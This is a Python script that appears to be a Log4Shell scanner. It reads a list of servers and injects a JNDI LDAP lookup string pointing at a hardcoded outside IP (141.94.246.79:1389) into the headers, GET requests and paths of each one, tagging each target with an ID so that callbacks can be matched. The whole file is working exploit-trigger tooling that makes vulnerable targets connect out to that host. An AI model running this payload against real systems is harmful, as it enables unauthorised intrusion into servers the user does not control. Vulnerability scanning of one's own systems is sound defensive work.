import argparse
import uuid
import tests

TESTING_HOST = "141.94.246.79:1389"
TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
OUTPUT_FILE = "ids.csv"
TESTS_LIST = [("Headers", tests.test_header),
              ("GET", tests.test_get),
              ("Path", tests.test_path)]


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("filename", help="path to the file with server:ip to test")
    args = parser.parse_args()
    return args.filename


def get_entries(filename):
    with open(filename) as file:
        lines = file.readlines()
        lines = [line.rstrip() for line in lines]
        return lines


def build_testing_payload(id):
    return TESTING_PAYLOAD.replace("HOST", TESTING_HOST).replace("ID", id)


def generate_endpoint_id(endpoint):
    return uuid.uuid4().hex


def generate_mappings(endpoints):
    return [(endpoint, generate_endpoint_id(endpoint)) for endpoint in endpoints]


def test_entry(endpoint, payload, id):
    print(f"[ID: {id}] Testing endpoint {endpoint}")
    for test_key, test_fun in TESTS_LIST:
        try:
            test_fun(endpoint, payload)
        except Exception as e:
            print(f" - [{test_key}] Test failed with: {e}")


def get_endpoints_from_entries(entries):
    return [x for y in [["http://" + entry, "https://" + entry] for entry in entries] for x in y]


def log_mappings(mappings):
    print(f"Endpoint-ID mapping (exported in {OUTPUT_FILE}):")
    for endpoint, id in mappings:
        print(f"{endpoint} -> {id}")


def generate_mapping_file(mappings):
    with open(OUTPUT_FILE, "w") as f:
        f.writelines([f"{id},{endpoint}\n" for endpoint, id in mappings])


# MAIN
if __name__ == '__main__':
    file = get_arguments()
    entries = get_entries(file)
    mappings = generate_mappings(get_endpoints_from_entries(entries))
    log_mappings(mappings)
    generate_mapping_file(mappings)
    print("\n")

    for endpoint, id in mappings:
        testing_payload = build_testing_payload(id)
        test_entry(endpoint, testing_payload, id)
